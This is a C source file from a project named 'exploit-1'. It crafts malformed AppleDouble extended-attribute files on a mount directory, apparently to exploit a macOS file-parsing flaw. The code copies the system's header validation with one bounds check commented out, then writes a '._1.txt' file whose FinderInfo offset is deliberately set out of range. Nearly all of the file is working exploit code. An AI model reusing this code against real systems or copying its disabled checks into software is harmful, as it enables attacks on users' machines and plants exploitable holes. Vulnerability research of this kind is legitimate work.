//
//  apple_double.c
//  exploit-1
//
//  Created by Quote on 2020/6/2.
//  Copyright Â© 2020 Quote. All rights reserved.
//

#include <stddef.h>
#include <stdint.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <libkern/OSByteOrder.h> // for OSSwapBigToHostInt16
#include "apple_double.h"

attr_info_t attrinfo;

static int check_and_swap_apple_double_header(attr_info_t *ainfop)
{
    int i, j;
    u_int32_t header_end;
    u_int32_t entry_end;
    size_t rawsize;
    apple_double_header_t *header;

    rawsize = ainfop->rawsize;
    header = (apple_double_header_t *) ainfop->rawdata;

    /* Is the file big enough to contain an AppleDouble header? */
    if (rawsize < offsetof(apple_double_header_t, entries)) {
        return ENOATTR;
    }

    /* Swap the AppleDouble header fields to native order */
    header->magic = SWAP32(header->magic);
    header->version = SWAP32(header->version);
    header->numEntries = SWAP16(header->numEntries);

    /* Sanity check the AppleDouble header fields */
    if (header->magic != ADH_MAGIC ||
        header->version != ADH_VERSION ||
        header->numEntries < 1 ||
        header->numEntries > 15) {
        return ENOATTR;
    }

    /* Calculate where the entries[] array ends */
    header_end = offsetof(apple_double_header_t, entries) +
        header->numEntries * sizeof(apple_double_entry_t);

    /* Is the file big enough to contain the AppleDouble entries? */
    if (rawsize < header_end) {
        return ENOATTR;
    }

    /* Swap and sanity check each AppleDouble entry */
    for (i = 0; i < header->numEntries; i++) {
        /* Swap the per-entry fields to native order */
        header->entries[i].type   = SWAP32(header->entries[i].type);
        header->entries[i].offset = SWAP32(header->entries[i].offset);
        header->entries[i].length = SWAP32(header->entries[i].length);

        entry_end = header->entries[i].offset + header->entries[i].length;

        /*
         * Does the entry's content start within the header itself,
         * did the addition overflow, or does the entry's content
         * extend past the end of the file?
         */
        if (header->entries[i].offset < header_end ||
            entry_end < header->entries[i].offset ||
            entry_end > ainfop->filesize) {
            return ENOATTR;
        }

        /*
         * Does the current entry's content overlap with a previous
         * entry's content?
         *
         * Yes, this is O(N**2), and there are more efficient algorithms
         * for testing pairwise overlap of N ranges when N is large.
         * But we have already ensured N < 16, and N is almost always 2.
         * So there's no point in using a more complex algorithm.
         */

        for (j = 0; j < i; j++) {
            if (entry_end > header->entries[j].offset &&
                header->entries[j].offset + header->entries[j].length > header->entries[i].offset) {
                return ENOATTR;
            }
        }
    }

    return 0;
}

static int
check_and_swap_attrhdr(attr_header_t *ah, attr_info_t *ainfop)
{
    attr_entry_t *ae;
    u_int8_t *buf_end;
    u_int32_t end;
    int count;
    int i;

    if (ah == NULL) {
        return EINVAL;
    }

    if (SWAP32(ah->magic) != ATTR_HDR_MAGIC) {
        return EINVAL;
    }

    /* Swap the basic header fields */
    ah->magic       = SWAP32(ah->magic);
    ah->debug_tag   = SWAP32(ah->debug_tag);
    ah->total_size  = SWAP32(ah->total_size);
    ah->data_start  = SWAP32(ah->data_start);
    ah->data_length = SWAP32(ah->data_length);
    ah->flags       = SWAP16(ah->flags);
    ah->num_attrs   = SWAP16(ah->num_attrs);

    /*
     * Make sure the total_size fits within the Finder Info area, and the
     * extended attribute data area fits within total_size.
     */
    end = ah->data_start + ah->data_length;
//    if (ah->total_size > ainfop->finderinfo->offset + ainfop->finderinfo->length ||
//        end < ah->data_start ||
//        end > ah->total_size) {
//        return EINVAL;
//    }

    /*
     * Make sure each of the attr_entry_t's fits within total_size.
     */
    buf_end = ainfop->rawdata + ah->total_size;
    count = ah->num_attrs;
    ae = (attr_entry_t *)(&ah[1]);

    for (i = 0; i < count; i++) {
        /* Make sure the fixed-size part of this attr_entry_t fits. */
        if ((u_int8_t *) &ae[1] > buf_end) {
            return EINVAL;
        }

        /* Make sure the variable-length name fits (+1 is for NUL terminator) */
        /* TODO: Make sure namelen matches strnlen(name,namelen+1)? */
        if (&ae->name[ae->namelen + 1] > buf_end) {
            return EINVAL;
        }

        /* Swap the attribute entry fields */
        ae->offset      = SWAP32(ae->offset);
        ae->length      = SWAP32(ae->length);
        ae->flags       = SWAP16(ae->flags);

        /* Make sure the attribute content fits. */
        end = ae->offset + ae->length;
        if (end < ae->offset || end > ah->total_size) {
            return EINVAL;
        }

        ae = ATTR_NEXT(ae);
    }

    return 0;
}

void load_xattr_template(const char *path)
{
    int err;
    FILE *fp;
    void *data;
    size_t size;

    data = malloc(ATTR_MAX_HDR_SIZE);
    memset(data, 0, ATTR_MAX_HDR_SIZE);
    fp = fopen(path, "rb");
    size = fread(data, 1, ATTR_MAX_HDR_SIZE, fp);
    fclose(fp);

    attrinfo.rawdata = data;
    attrinfo.rawsize = size;
    attrinfo.filesize = ATTR_MAX_HDR_SIZE;

    err = check_and_swap_apple_double_header(&attrinfo);
    if (err) {
        printf("xattr template is invalid, double header\n");
        exit(-1);
    }

    attrinfo.filehdr = (apple_double_header_t *)data;  /* valid AppleDouble header */

    attr_header_t *attrhdr = (attr_header_t*)attrinfo.filehdr;

    err = check_and_swap_attrhdr(attrhdr, &attrinfo);
    if (err) {
        printf("xattr template is invalid, attrhdr\n");
        exit(-1);
    }
    attrinfo.attrhdr = attrhdr;  /* valid attribute header */
    /* First attr_entry starts immediately following attribute header */
    attrinfo.attr_entry = (attr_entry_t *)&attrhdr[1];
}

void create_xattr_template(void)
{
    const char *template_txt = MOUNT_DIR "temp.txt";
    int err;
    FILE *fp;

    mkdir(MOUNT_DIR "test", 0755);
    remove(MOUNT_DIR "._temp.txt");
    remove(template_txt);

    fp = fopen(template_txt, "wb");
    fclose(fp);
    err = setxattr(template_txt, "xattr4", "1111", 4, 0, XATTR_CREATE);
    assert(err == 0);

    fp = fopen(MOUNT_DIR "test/1.txt", "wb");
    fclose(fp);
    fp = fopen(MOUNT_DIR "test/2.txt", "wb");
    fclose(fp);

    load_xattr_template(MOUNT_DIR "._temp.txt");

    void *data;
    size_t size;
    uint8_t raw_byte;
    uint32_t raw_offset;

    size_t xattrfile_size = ATTR_MAX_HDR_SIZE + 0x1000;
    data = malloc(xattrfile_size);
    memset(data, 0, xattrfile_size);
    fp = fopen(MOUNT_DIR "._temp.txt", "rb");
    size = fread(data, 1, xattrfile_size, fp);
    fclose(fp);

    apple_double_header_t *header = (apple_double_header_t *)data;
    apple_double_entry_t *entry = &header->entries[0];

    fp = fopen(MOUNT_DIR "test/._1.txt", "wb");
    raw_offset = (uint32_t)-1;
    for (int i = 0; i < 2; i++) {
        if (entry->type == SWAP32(9) /* AD_FINDERINFO */) {
            raw_offset = entry->offset;
            entry->offset = SWAP32(0x10000);
        }
    }
    assert(raw_offset != (uint32_t)-1);
    fwrite(data, 1, xattrfile_size, fp);
    for (int i = 0; i < 2; i++) {
        if (entry->type == SWAP32(9) /* AD_FINDERINFO */) {
            entry->offset = raw_offset;
        }
    }
    fclose(fp);

    free(data);
}
